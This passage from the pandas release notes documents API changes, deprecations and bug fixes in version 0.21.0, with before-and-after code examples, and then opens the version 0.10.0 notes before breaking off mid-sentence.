index=pi)\n\n   In [58]: s.resample('H').ohlc()\n   Out[58]:\n                     open  high  low  close\n   2000-01-01 00:00   0.0   0.0  0.0    0.0\n   2000-01-01 01:00   NaN   NaN  NaN    NaN\n   2000-01-01 02:00   NaN   NaN  NaN    NaN\n   2000-01-01 03:00   NaN   NaN  NaN    NaN\n   2000-01-01 04:00   NaN   NaN  NaN    NaN\n   ...                ...   ...  ...    ...\n   2000-01-10 19:00   NaN   NaN  NaN    NaN\n   2000-01-10 20:00   NaN   NaN  NaN    NaN\n   2000-01-10 21:00   NaN   NaN  NaN    NaN\n   2000-01-10 22:00   NaN   NaN  NaN    NaN\n   2000-01-10 23:00   NaN   NaN  NaN    NaN\n\n   [240 rows x 4 columns]\n\n   In [59]: s.resample('M').ohlc()\n   Out[59]:\n            open  high  low  close\n   2000-01     0     9    0      9\n\n   [1 rows x 4 columns]\n\n\n.. _whatsnew_0210.api_breaking.pandas_eval:\n\nImproved error handling during item assignment in pd.eval\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`eval` will now raise a ``ValueError`` when item assignment malfunctions, or\ninplace operations are specified, but there is no item assignment in the expression (:issue:`16732`)\n\n.. ipython:: python\n\n   arr = np.array([1, 2, 3])\n\nPreviously, if you attempted the following expression, you would get a not very helpful error message:\n\n.. code-block:: ipython\n\n   In [3]: pd.eval(\"a = 1 + 2\", target=arr, inplace=True)\n   ...\n   IndexError: only integers, slices (`:`), ellipsis (`...`), numpy.newaxis (`None`)\n   and integer or boolean arrays are valid indices\n\nThis is a very long way of saying numpy arrays don't support string-item indexing. With this\nchange, the error message is now this:\n\n.. code-block:: python\n\n   In [3]: pd.eval(\"a = 1 + 2\", target=arr, inplace=True)\n   ...\n   ValueError: Cannot assign expression output to target\n\nIt also used to be possible to evaluate expressions inplace, even if there was no item assignment:\n\n.. code-block:: ipython\n\n   In [4]: pd.eval(\"1 + 2\", target=arr, inplace=True)\n   Out[4]: 3\n\nHowever, this input does not make much sense because the output is not being assigned to\nthe target. Now, a ``ValueError`` will be raised when such an input is passed in:\n\n.. code-block:: ipython\n\n   In [4]: pd.eval(\"1 + 2\", target=arr, inplace=True)\n   ...\n   ValueError: Cannot operate inplace if there is no assignment\n\n\n.. _whatsnew_0210.api_breaking.dtype_conversions:\n\nDtype conversions\n^^^^^^^^^^^^^^^^^\n\nPreviously assignments, ``.where()`` and ``.fillna()`` with a ``bool`` assignment, would coerce to same the type (e.g. int / float), or raise for datetimelikes. These will now preserve the bools with ``object`` dtypes. (:issue:`16821`).\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3])\n\n.. code-block:: python\n\n   In [5]: s[1] = True\n\n   In [6]: s\n   Out[6]:\n   0    1\n   1    1\n   2    3\n   dtype: int64\n\nNew behavior\n\n.. code-block:: ipython\n\n   In [7]: s[1] = True\n\n   In [8]: s\n   Out[8]:\n   0       1\n   1    True\n   2       3\n   Length: 3, dtype: object\n\nPreviously, as assignment to a datetimelike with a non-datetimelike would coerce the\nnon-datetime-like item being assigned (:issue:`14145`).\n\n.. ipython:: python\n\n   s = pd.Series([pd.Timestamp('2011-01-01'), pd.Timestamp('2012-01-01')])\n\n.. code-block:: python\n\n   In [1]: s[1] = 1\n\n   In [2]: s\n   Out[2]:\n   0   2011-01-01 00:00:00.000000000\n   1   1970-01-01 00:00:00.000000001\n   dtype: datetime64[ns]\n\nThese now coerce to ``object`` dtype.\n\n.. code-block:: python\n\n   In [1]: s[1] = 1\n\n   In [2]: s\n   Out[2]:\n   0    2011-01-01 00:00:00\n   1                      1\n   dtype: object\n\n- Inconsistent behavior in ``.where()`` with datetimelikes which would raise rather than coerce to ``object`` (:issue:`16402`)\n- Bug in assignment against ``int64`` data with ``np.ndarray`` with ``float64`` dtype may keep ``int64`` dtype (:issue:`14001`)\n\n\n.. _whatsnew_210.api.multiindex_single:\n\nMultiIndex constructor with a single level\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``MultiIndex`` constructors no longer squeezes a MultiIndex with all\nlength-one levels down to a regular ``Index``. This affects all the\n``MultiIndex`` constructors. (:issue:`17178`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [2]: pd.MultiIndex.from_tuples([('a',), ('b',)])\n   Out[2]: Index(['a', 'b'], dtype='object')\n\nLength 1 levels are no longer special-cased. They behave exactly as if you had\nlength 2+ levels, so a :class:`MultiIndex` is always returned from all of the\n``MultiIndex`` constructors:\n\n.. ipython:: python\n\n   pd.MultiIndex.from_tuples([('a',), ('b',)])\n\n.. _whatsnew_0210.api.utc_localization_with_series:\n\nUTC localization with Series\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, :func:`to_datetime` did not localize datetime ``Series`` data when ``utc=True`` was passed. Now, :func:`to_datetime` will correctly localize ``Series`` with a ``datetime64[ns, UTC]`` dtype to be consistent with how list-like and ``Index`` data are handled. (:issue:`6415`).\n\nPrevious behavior\n\n.. ipython:: python\n\n   s = pd.Series(['20130101 00:00:00'] * 3)\n\n.. code-block:: ipython\n\n   In [12]: pd.to_datetime(s, utc=True)\n   Out[12]:\n   0   2013-01-01\n   1   2013-01-01\n   2   2013-01-01\n   dtype: datetime64[ns]\n\nNew behavior\n\n.. ipython:: python\n\n   pd.to_datetime(s, utc=True)\n\nAdditionally, DataFrames with datetime columns that were parsed by :func:`read_sql_table` and :func:`read_sql_query` will also be localized to UTC only if the original SQL columns were timezone aware datetime columns.\n\n.. _whatsnew_0210.api.consistency_of_range_functions:\n\nConsistency of range functions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions, there were some inconsistencies between the various range functions: :func:`date_range`, :func:`bdate_range`, :func:`period_range`, :func:`timedelta_range`, and :func:`interval_range`. (:issue:`17471`).\n\nOne of the inconsistent behaviors occurred when the ``start``, ``end`` and ``period`` parameters were all specified, potentially leading to ambiguous ranges.  When all three parameters were passed, ``interval_range`` ignored the ``period`` parameter, ``period_range`` ignored the ``end`` parameter, and the other range functions raised.  To promote consistency among the range functions, and avoid potentially ambiguous ranges, ``interval_range`` and ``period_range`` will now raise when all three parameters are passed.\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [2]: pd.interval_range(start=0, end=4, periods=6)\n   Out[2]:\n   IntervalIndex([(0, 1], (1, 2], (2, 3]]\n                 closed='right',\n                 dtype='interval[int64]')\n\n  In [3]: pd.period_range(start='2017Q1', end='2017Q4', periods=6, freq='Q')\n  Out[3]: PeriodIndex(['2017Q1', '2017Q2', '2017Q3', '2017Q4', '2018Q1', '2018Q2'], dtype='period[Q-DEC]', freq='Q-DEC')\n\nNew behavior:\n\n.. code-block:: ipython\n\n  In [2]: pd.interval_range(start=0, end=4, periods=6)\n  ---------------------------------------------------------------------------\n  ValueError: Of the three parameters: start, end, and periods, exactly two must be specified\n\n  In [3]: pd.period_range(start='2017Q1', end='2017Q4', periods=6, freq='Q')\n  ---------------------------------------------------------------------------\n  ValueError: Of the three parameters: start, end, and periods, exactly two must be specified\n\nAdditionally, the endpoint parameter ``end`` was not included in the intervals produced by ``interval_range``.  However, all other range functions include ``end`` in their output.  To promote consistency among the range functions, ``interval_range`` will now include ``end`` as the right endpoint of the final interval, except if ``freq`` is specified in a way which skips ``end``.\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [4]: pd.interval_range(start=0, end=4)\n   Out[4]:\n   IntervalIndex([(0, 1], (1, 2], (2, 3]]\n                 closed='right',\n                 dtype='interval[int64]')\n\n\nNew behavior:\n\n.. ipython:: python\n\n   pd.interval_range(start=0, end=4)\n\n.. _whatsnew_0210.api.mpl_converters:\n\nNo automatic Matplotlib converters\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas no longer registers our ``date``, ``time``, ``datetime``,\n``datetime64``, and ``Period`` converters with matplotlib when pandas is\nimported. Matplotlib plot methods (``plt.plot``, ``ax.plot``, ...), will not\nnicely format the x-axis for ``DatetimeIndex`` or ``PeriodIndex`` values. You\nmust explicitly register these methods:\n\npandas built-in ``Series.plot`` and ``DataFrame.plot`` *will* register these\nconverters on first-use (:issue:`17710`).\n\n.. note::\n\n  This change has been temporarily reverted in pandas 0.21.1,\n  for more details see :ref:`here <whatsnew_0211.converters>`.\n\n.. _whatsnew_0210.api:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- The Categorical constructor no longer accepts a scalar for the ``categories`` keyword. (:issue:`16022`)\n- Accessing a non-existent attribute on a closed :class:`~pandas.HDFStore` will now\n  raise an ``AttributeError`` rather than a ``ClosedFileError`` (:issue:`16301`)\n- :func:`read_csv` now issues a ``UserWarning`` if the ``names`` parameter contains duplicates (:issue:`17095`)\n- :func:`read_csv` now treats ``'null'`` and ``'n/a'`` strings as missing values by default (:issue:`16471`, :issue:`16078`)\n- :class:`pandas.HDFStore`'s string representation is now faster and less detailed. For the previous behavior, use ``pandas.HDFStore.info()``. (:issue:`16503`).\n- Compression defaults in HDF stores now follow pytables standards. Default is no compression and if ``complib`` is missing and ``complevel`` > 0 ``zlib`` is used (:issue:`15943`)\n- ``Index.get_indexer_non_unique()`` now returns a ndarray indexer rather than an ``Index``; this is consistent with ``Index.get_indexer()`` (:issue:`16819`)\n- Removed the ``slow`` decorator from ``pandas._testing``, which caused issues for some downstream packages' test suites. Use ``pytest.mark.slow`` instead, which achieves the same thing (:issue:`16850`)\n- Moved definition of ``MergeError`` to the ``pandas.errors`` module.\n- The signature of :func:`Series.set_axis` and :func:`DataFrame.set_axis` has been changed from ``set_axis(axis, labels)`` to ``set_axis(labels, axis=0)``, for consistency with the rest of the API. The old signature is deprecated and will show a ``FutureWarning`` (:issue:`14636`)\n- :func:`Series.argmin` and :func:`Series.argmax` will now raise a ``TypeError`` when used with ``object`` dtypes, instead of a ``ValueError`` (:issue:`13595`)\n- :class:`Period` is now immutable, and will now raise an ``AttributeError`` when a user tries to assign a new value to the ``ordinal`` or ``freq`` attributes (:issue:`17116`).\n- :func:`to_datetime` when passed a tz-aware ``origin=`` kwarg will now raise a more informative ``ValueError`` rather than a ``TypeError`` (:issue:`16842`)\n- :func:`to_datetime` now raises a ``ValueError`` when format includes ``%W`` or ``%U`` without also including day of the week and calendar year (:issue:`16774`)\n- Renamed non-functional ``index`` to ``index_col`` in :func:`read_stata` to improve API consistency (:issue:`16342`)\n- Bug in :func:`DataFrame.drop` caused boolean labels ``False`` and ``True`` to be treated as labels 0 and 1 respectively when dropping indices from a numeric index. This will now raise a ValueError (:issue:`16877`)\n- Restricted DateOffset keyword arguments.  Previously, ``DateOffset`` subclasses allowed arbitrary keyword arguments which could lead to unexpected behavior.  Now, only valid arguments will be accepted. (:issue:`17176`).\n\n.. _whatsnew_0210.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- :meth:`DataFrame.from_csv` and :meth:`Series.from_csv` have been deprecated in favor of :func:`read_csv()` (:issue:`4191`)\n- :func:`read_excel()` has deprecated ``sheetname`` in favor of ``sheet_name`` for consistency with ``.to_excel()`` (:issue:`10559`).\n- :func:`read_excel()` has deprecated ``parse_cols`` in favor of ``usecols`` for consistency with :func:`read_csv` (:issue:`4988`)\n- :func:`read_csv()` has deprecated the ``tupleize_cols`` argument. Column tuples will always be converted to a ``MultiIndex`` (:issue:`17060`)\n- :meth:`DataFrame.to_csv` has deprecated the ``tupleize_cols`` argument. MultiIndex columns will be always written as rows in the CSV file (:issue:`17060`)\n- The ``convert`` parameter has been deprecated in the ``.take()`` method, as it was not being respected (:issue:`16948`)\n- ``pd.options.html.border`` has been deprecated in favor of ``pd.options.display.html.border`` (:issue:`15793`).\n- :func:`SeriesGroupBy.nth` has deprecated ``True`` in favor of ``'all'`` for its kwarg ``dropna`` (:issue:`11038`).\n- :func:`DataFrame.as_blocks` is deprecated, as this is exposing the internal implementation (:issue:`17302`)\n- ``pd.TimeGrouper`` is deprecated in favor of :class:`pandas.Grouper` (:issue:`16747`)\n- ``cdate_range`` has been deprecated in favor of :func:`bdate_range`, which has gained ``weekmask`` and ``holidays`` parameters for building custom frequency date ranges. See the :ref:`documentation <timeseries.custom-freq-ranges>` for more details (:issue:`17596`)\n- passing ``categories`` or ``ordered`` kwargs to :func:`Series.astype` is deprecated, in favor of passing a :ref:`CategoricalDtype <whatsnew_0210.enhancements.categorical_dtype>` (:issue:`17636`)\n- ``.get_value`` and ``.set_value`` on ``Series``, ``DataFrame``, ``Panel``, ``SparseSeries``, and ``SparseDataFrame`` are deprecated in favor of using ``.iat[]`` or ``.at[]`` accessors (:issue:`15269`)\n- Passing a non-existent column in ``.to_excel(..., columns=)`` is deprecated and will raise a ``KeyError`` in the future (:issue:`17295`)\n- ``raise_on_error`` parameter to :func:`Series.where`, :func:`Series.mask`, :func:`DataFrame.where`, :func:`DataFrame.mask` is deprecated, in favor of ``errors=`` (:issue:`14968`)\n- Using :meth:`DataFrame.rename_axis` and :meth:`Series.rename_axis` to alter index or column *labels* is now deprecated in favor of using ``.rename``. ``rename_axis`` may still be used to alter the name of the index or columns (:issue:`17833`).\n- :meth:`~DataFrame.reindex_axis` has been deprecated in favor of :meth:`~DataFrame.reindex`. See :ref:`here <whatsnew_0210.enhancements.rename_reindex_axis>` for more (:issue:`17833`).\n\n.. _whatsnew_0210.deprecations.select:\n\nSeries.select and DataFrame.select\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :meth:`Series.select` and :meth:`DataFrame.select` methods are deprecated in favor of using ``df.loc[labels.map(crit)]`` (:issue:`12401`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': [1, 2, 3]}, index=['foo', 'bar', 'baz'])\n\n.. code-block:: ipython\n\n   In [3]: df.select(lambda x: x in ['bar', 'baz'])\n   FutureWarning: select is deprecated and will be removed in a future release. You can use .loc[crit] as a replacement\n   Out[3]:\n        A\n   bar  2\n   baz  3\n\n.. ipython:: python\n\n   df.loc[df.index.map(lambda x: x in ['bar', 'baz'])]\n\n\n.. _whatsnew_0210.deprecations.argmin_min:\n\nSeries.argmax and Series.argmin\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe behavior of :func:`Series.argmax` and :func:`Series.argmin` have been deprecated in favor of :func:`Series.idxmax` and :func:`Series.idxmin`, respectively (:issue:`16830`).\n\nFor compatibility with NumPy arrays, ``pd.Series`` implements ``argmax`` and\n``argmin``. Since pandas 0.13.0, ``argmax`` has been an alias for\n:meth:`pandas.Series.idxmax`, and ``argmin`` has been an alias for\n:meth:`pandas.Series.idxmin`. They return the *label* of the maximum or minimum,\nrather than the *position*.\n\nWe've deprecated the current behavior of ``Series.argmax`` and\n``Series.argmin``. Using either of these will emit a ``FutureWarning``. Use\n:meth:`Series.idxmax` if you want the label of the maximum. Use\n``Series.values.argmax()`` if you want the position of the maximum. Likewise for\nthe minimum. In a future release ``Series.argmax`` and ``Series.argmin`` will\nreturn the position of the maximum or minimum.\n\n.. _whatsnew_0210.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- :func:`read_excel()` has dropped the ``has_index_names`` parameter (:issue:`10967`)\n- The ``pd.options.display.height`` configuration has been dropped (:issue:`3663`)\n- The ``pd.options.display.line_width`` configuration has been dropped (:issue:`2881`)\n- The ``pd.options.display.mpl_style`` configuration has been dropped (:issue:`12190`)\n- ``Index`` has dropped the ``.sym_diff()`` method in favor of ``.symmetric_difference()`` (:issue:`12591`)\n- ``Categorical`` has dropped the ``.order()`` and ``.sort()`` methods in favor of ``.sort_values()`` (:issue:`12882`)\n- :func:`eval` and :func:`DataFrame.eval` have changed the default of ``inplace`` from ``None`` to ``False`` (:issue:`11149`)\n- The function ``get_offset_name`` has been dropped in favor of the ``.freqstr`` attribute for an offset (:issue:`11834`)\n- pandas no longer tests for compatibility with hdf5-files created with pandas < 0.11 (:issue:`17404`).\n\n\n\n.. _whatsnew_0210.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improved performance of instantiating :class:`SparseDataFrame` (:issue:`16773`)\n- :attr:`Series.dt` no longer performs frequency inference, yielding a large speedup when accessing the attribute (:issue:`17210`)\n- Improved performance of :meth:`~Series.cat.set_categories` by not materializing the values (:issue:`17508`)\n- :attr:`Timestamp.microsecond` no longer re-computes on attribute access (:issue:`17331`)\n- Improved performance of the :class:`CategoricalIndex` for data that is already categorical dtype (:issue:`17513`)\n- Improved performance of :meth:`RangeIndex.min` and :meth:`RangeIndex.max` by using ``RangeIndex`` properties to perform the computations (:issue:`17607`)\n\n.. _whatsnew_0210.docs:\n\nDocumentation changes\n~~~~~~~~~~~~~~~~~~~~~\n\n- Several ``NaT`` method docstrings (e.g. :func:`NaT.ctime`) were incorrect (:issue:`17327`)\n- The documentation has had references to versions < v0.17 removed and cleaned up (:issue:`17442`, :issue:`17442`, :issue:`17404` & :issue:`17504`)\n\n.. _whatsnew_0210.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nConversion\n^^^^^^^^^^\n\n- Bug in assignment against datetime-like data with ``int`` may incorrectly convert to datetime-like (:issue:`14145`)\n- Bug in assignment against ``int64`` data with ``np.ndarray`` with ``float64`` dtype may keep ``int64`` dtype (:issue:`14001`)\n- Fixed the return type of ``IntervalIndex.is_non_overlapping_monotonic`` to be a Python ``bool`` for consistency with similar attributes/methods.  Previously returned a ``numpy.bool_``. (:issue:`17237`)\n- Bug in ``IntervalIndex.is_non_overlapping_monotonic`` when intervals are closed on both sides and overlap at a point (:issue:`16560`)\n- Bug in :func:`Series.fillna` returns frame when ``inplace=True`` and ``value`` is dict (:issue:`16156`)\n- Bug in :attr:`Timestamp.weekday_name` returning a UTC-based weekday name when localized to a timezone (:issue:`17354`)\n- Bug in ``Timestamp.replace`` when replacing ``tzinfo`` around DST changes (:issue:`15683`)\n- Bug in ``Timedelta`` construction and arithmetic that would not propagate the ``Overflow`` exception (:issue:`17367`)\n- Bug in :meth:`~DataFrame.astype` converting to object dtype when passed extension type classes (``DatetimeTZDtype``, ``CategoricalDtype``) rather than instances. Now a ``TypeError`` is raised when a class is passed (:issue:`17780`).\n- Bug in :meth:`to_numeric` in which elements were not always being coerced to numeric when ``errors='coerce'`` (:issue:`17007`, :issue:`17125`)\n- Bug in ``DataFrame`` and ``Series`` constructors where ``range`` objects are converted to ``int32`` dtype on Windows instead of ``int64`` (:issue:`16804`)\n\nIndexing\n^^^^^^^^\n\n- When called with a null slice (e.g. ``df.iloc[:]``), the ``.iloc`` and ``.loc`` indexers return a shallow copy of the original object. Previously they returned the original object. (:issue:`13873`).\n- When called on an unsorted ``MultiIndex``, the ``loc`` indexer now will raise ``UnsortedIndexError`` only if proper slicing is used on non-sorted levels (:issue:`16734`).\n- Fixes regression in 0.20.3 when indexing with a string on a ``TimedeltaIndex`` (:issue:`16896`).\n- Fixed :func:`TimedeltaIndex.get_loc` handling of ``np.timedelta64`` inputs (:issue:`16909`).\n- Fix :func:`MultiIndex.sort_index` ordering when ``ascending`` argument is a list, but not all levels are specified, or are in a different order (:issue:`16934`).\n- Fixes bug where indexing with ``np.inf`` caused an ``OverflowError`` to be raised (:issue:`16957`)\n- Bug in reindexing on an empty ``CategoricalIndex`` (:issue:`16770`)\n- Fixes ``DataFrame.loc`` for setting with alignment and tz-aware ``DatetimeIndex`` (:issue:`16889`)\n- Avoids ``IndexError`` when passing an Index or Series to ``.iloc`` with older numpy (:issue:`17193`)\n- Allow unicode empty strings as placeholders in multilevel columns in Python 2 (:issue:`17099`)\n- Bug in ``.iloc`` when used with inplace addition or assignment and an int indexer on a ``MultiIndex`` causing the wrong indexes to be read from and written to (:issue:`17148`)\n- Bug in ``.isin()`` in which checking membership in empty ``Series`` objects raised an error (:issue:`16991`)\n- Bug in ``CategoricalIndex`` reindexing in which specified indices containing duplicates were not being respected (:issue:`17323`)\n- Bug in intersection of ``RangeIndex`` with negative step (:issue:`17296`)\n- Bug in ``IntervalIndex`` where performing a scalar lookup fails for included right endpoints of non-overlapping monotonic decreasing indexes (:issue:`16417`, :issue:`17271`)\n- Bug in :meth:`DataFrame.first_valid_index` and :meth:`DataFrame.last_valid_index` when no valid entry (:issue:`17400`)\n- Bug in :func:`Series.rename` when called with a callable, incorrectly alters the name of the ``Series``, rather than the name of the ``Index``. (:issue:`17407`)\n- Bug in :func:`String.str_get` raises ``IndexError`` instead of inserting NaNs when using a negative index. (:issue:`17704`)\n\nIO\n^^\n\n- Bug in :func:`read_hdf` when reading a timezone aware index from ``fixed`` format HDFStore (:issue:`17618`)\n- Bug in :func:`read_csv` in which columns were not being thoroughly de-duplicated (:issue:`17060`)\n- Bug in :func:`read_csv` in which specified column names were not being thoroughly de-duplicated (:issue:`17095`)\n- Bug in :func:`read_csv` in which non integer values for the header argument generated an unhelpful / unrelated error message (:issue:`16338`)\n- Bug in :func:`read_csv` in which memory management issues in exception handling, under certain conditions, would cause the interpreter to segfault (:issue:`14696`, :issue:`16798`).\n- Bug in :func:`read_csv` when called with ``low_memory=False`` in which a CSV with at least one column > 2GB in size would incorrectly raise a ``MemoryError`` (:issue:`16798`).\n- Bug in :func:`read_csv` when called with a single-element list ``header`` would return a ``DataFrame`` of all NaN values (:issue:`7757`)\n- Bug in :meth:`DataFrame.to_csv` defaulting to 'ascii' encoding in Python 3, instead of 'utf-8' (:issue:`17097`)\n- Bug in :func:`read_stata` where value labels could not be read when using an iterator (:issue:`16923`)\n- Bug in :func:`read_stata` where the index was not set (:issue:`16342`)\n- Bug in :func:`read_html` where import check fails when run in multiple threads (:issue:`16928`)\n- Bug in :func:`read_csv` where automatic delimiter detection caused a ``TypeError`` to be thrown when a bad line was encountered rather than the correct error message (:issue:`13374`)\n- Bug in :meth:`DataFrame.to_html` with ``notebook=True`` where DataFrames with named indices or non-MultiIndex indices had undesired horizontal or vertical alignment for column or row labels, respectively (:issue:`16792`)\n- Bug in :meth:`DataFrame.to_html` in which there was no validation of the ``justify`` parameter (:issue:`17527`)\n- Bug in :func:`HDFStore.select` when reading a contiguous mixed-data table featuring VLArray (:issue:`17021`)\n- Bug in :func:`to_json` where several conditions (including objects with unprintable symbols, objects with deep recursion, overlong labels) caused segfaults instead of raising the appropriate exception (:issue:`14256`)\n\nPlotting\n^^^^^^^^\n- Bug in plotting methods using ``secondary_y`` and ``fontsize`` not setting secondary axis font size (:issue:`12565`)\n- Bug when plotting ``timedelta`` and ``datetime`` dtypes on y-axis (:issue:`16953`)\n- Line plots no longer assume monotonic x data when calculating xlims, they show the entire lines now even for unsorted x data. (:issue:`11310`, :issue:`11471`)\n- With matplotlib 2.0.0 and above, calculation of x limits for line plots is left to matplotlib, so that its new default settings are applied. (:issue:`15495`)\n- Bug in ``Series.plot.bar`` or ``DataFrame.plot.bar`` with ``y`` not respecting user-passed ``color`` (:issue:`16822`)\n- Bug causing ``plotting.parallel_coordinates`` to reset the random seed when using random colors (:issue:`17525`)\n\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in ``DataFrame.resample(...).size()`` where an empty ``DataFrame`` did not return a ``Series`` (:issue:`14962`)\n- Bug in :func:`infer_freq` causing indices with 2-day gaps during the working week to be wrongly inferred as business daily (:issue:`16624`)\n- Bug in ``.rolling(...).quantile()`` which incorrectly used different defaults than :func:`Series.quantile()` and :func:`DataFrame.quantile()` (:issue:`9413`, :issue:`16211`)\n- Bug in ``groupby.transform()`` that would coerce boolean dtypes back to float (:issue:`16875`)\n- Bug in ``Series.resample(...).apply()`` where an empty ``Series`` modified the source index and did not return the name of a ``Series`` (:issue:`14313`)\n- Bug in ``.rolling(...).apply(...)`` with a ``DataFrame`` with a ``DatetimeIndex``, a ``window`` of a timedelta-convertible and ``min_periods >= 1`` (:issue:`15305`)\n- Bug in ``DataFrame.groupby`` where index and column keys were not recognized correctly when the number of keys equaled the number of elements on the groupby axis (:issue:`16859`)\n- Bug in ``groupby.nunique()`` with ``TimeGrouper`` which cannot handle ``NaT`` correctly (:issue:`17575`)\n- Bug in ``DataFrame.groupby`` where a single level selection from a ``MultiIndex`` unexpectedly sorts (:issue:`17537`)\n- Bug in ``DataFrame.groupby`` where spurious warning is raised when ``Grouper`` object is used to override ambiguous column name (:issue:`17383`)\n- Bug in ``TimeGrouper`` differs when passes as a list and as a scalar (:issue:`17530`)\n\nSparse\n^^^^^^\n\n- Bug in ``SparseSeries`` raises ``AttributeError`` when a dictionary is passed in as data (:issue:`16905`)\n- Bug in :func:`SparseDataFrame.fillna` not filling all NaNs when frame was instantiated from SciPy sparse matrix (:issue:`16112`)\n- Bug in :func:`SparseSeries.unstack` and :func:`SparseDataFrame.stack` (:issue:`16614`, :issue:`15045`)\n- Bug in :func:`make_sparse` treating two numeric/boolean data, which have same bits, as same when array ``dtype`` is ``object`` (:issue:`17574`)\n- :func:`SparseArray.all` and :func:`SparseArray.any` are now implemented to handle ``SparseArray``, these were used but not implemented (:issue:`17570`)\n\nReshaping\n^^^^^^^^^\n- Joining/Merging with a non unique ``PeriodIndex`` raised a ``TypeError`` (:issue:`16871`)\n- Bug in :func:`crosstab` where non-aligned series of integers were casted to float (:issue:`17005`)\n- Bug in merging with categorical dtypes with datetimelikes incorrectly raised a ``TypeError`` (:issue:`16900`)\n- Bug when using :func:`isin` on a large object series and large comparison array (:issue:`16012`)\n- Fixes regression from 0.20, :func:`Series.aggregate` and :func:`DataFrame.aggregate` allow dictionaries as return values again (:issue:`16741`)\n- Fixes dtype of result with integer dtype input, from :func:`pivot_table` when called with ``margins=True`` (:issue:`17013`)\n- Bug in :func:`crosstab` where passing two ``Series`` with the same name raised a ``KeyError`` (:issue:`13279`)\n- :func:`Series.argmin`, :func:`Series.argmax`, and their counterparts on ``DataFrame`` and groupby objects work correctly with floating point data that contains infinite values (:issue:`13595`).\n- Bug in :func:`unique` where checking a tuple of strings raised a ``TypeError`` (:issue:`17108`)\n- Bug in :func:`concat` where order of result index was unpredictable if it contained non-comparable elements (:issue:`17344`)\n- Fixes regression when sorting by multiple columns on a ``datetime64`` dtype ``Series`` with ``NaT`` values (:issue:`16836`)\n- Bug in :func:`pivot_table` where the result's columns did not preserve the categorical dtype of ``columns`` when ``dropna`` was ``False`` (:issue:`17842`)\n- Bug in ``DataFrame.drop_duplicates`` where dropping with non-unique column names raised a ``ValueError`` (:issue:`17836`)\n- Bug in :func:`unstack` which, when called on a list of levels, would discard the ``fillna`` argument (:issue:`13971`)\n- Bug in the alignment of ``range`` objects and other list-likes with ``DataFrame`` leading to operations being performed row-wise instead of column-wise (:issue:`17901`)\n\nNumeric\n^^^^^^^\n- Bug in ``.clip()`` with ``axis=1`` and a list-like for ``threshold`` is passed; previously this raised ``ValueError`` (:issue:`15390`)\n- :func:`Series.clip()` and :func:`DataFrame.clip()` now treat NA values for upper and lower arguments as ``None`` instead of raising ``ValueError`` (:issue:`17276`).\n\n\nCategorical\n^^^^^^^^^^^\n- Bug in :func:`Series.isin` when called with a categorical (:issue:`16639`)\n- Bug in the categorical constructor with empty values and categories causing the ``.categories`` to be an empty ``Float64Index`` rather than an empty ``Index`` with object dtype (:issue:`17248`)\n- Bug in categorical operations with :ref:`Series.cat <categorical.cat>` not preserving the original Series' name (:issue:`17509`)\n- Bug in :func:`DataFrame.merge` failing for categorical columns with boolean/int data types (:issue:`17187`)\n- Bug in constructing a ``Categorical``/``CategoricalDtype`` when the specified ``categories`` are of categorical type (:issue:`17884`).\n\n.. _whatsnew_0210.pypy:\n\nPyPy\n^^^^\n\n- Compatibility with PyPy in :func:`read_csv` with ``usecols=[<unsorted ints>]`` and\n  :func:`read_json` (:issue:`17351`)\n- Split tests into cases for CPython and PyPy where needed, which highlights the fragility\n  of index matching with ``float('nan')``, ``np.nan`` and ``NAT`` (:issue:`17351`)\n- Fix :func:`DataFrame.memory_usage` to support PyPy. Objects on PyPy do not have a fixed size,\n  so an approximation is used instead (:issue:`17228`)\n\nOther\n^^^^^\n- Bug where some inplace operators were not being wrapped and produced a copy when invoked (:issue:`12962`)\n- Bug in :func:`eval` where the ``inplace`` parameter was being incorrectly handled (:issue:`16732`)\n\n\n\n.. _whatsnew_0.21.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.20.3..v0.21.0\n\n\n.. _whatsnew_0100:\n\nVersion 0.10.0 (December 17, 2012)\n----------------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.9.1 and includes many new features and\nenhancements along with a large number of bug fixes. There are also a number of\nimportant API changes that long-time pandas users should pay close attention\nto.\n\nFile parsing new features\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe delimited file parsing engine (the guts of ``read_csv`` and ``read_table``)\nhas been rewritten from the ground up and now uses a fraction the amount of\nmemory while parsing, while being 40% or more faster in most use cases (in some\ncases much faster).\n\nThere are also many new features:\n\n- Much-improved Unicode handling via the ``encoding`` option.\n- Column filtering (``usecols``)\n- Dtype specification (``dtype`` argument)\n- Ability to specify strings to be recognized as True/False\n- Ability to yield NumPy record arrays (``as_recarray``)\n- High performance ``delim_whitespace`` option\n- Decimal format (e.g. European format) specification\n- Easier CSV dialect options: ``escapechar``, ``lineterminator``,\n  ``quotechar``, etc.\n- More robust handling of many exceptional kinds of files observed in the wild\n\nAPI changes\n~~~~~~~~~~~\n\n**Deprecated DataFrame BINOP TimeSeries special case behavior**\n\nThe default behavior of binary operations between a DataFrame and a Series has\nalways been to align on the DataFrame's columns and broadcast down the rows,\n**except** in the special case that the DataFrame contains time series. Since\nthere are now method for each binary operator enabling you to specify how you\nwant to broadcast, we are phasing out this special case (Zen of Python:\n*Special cases aren't special 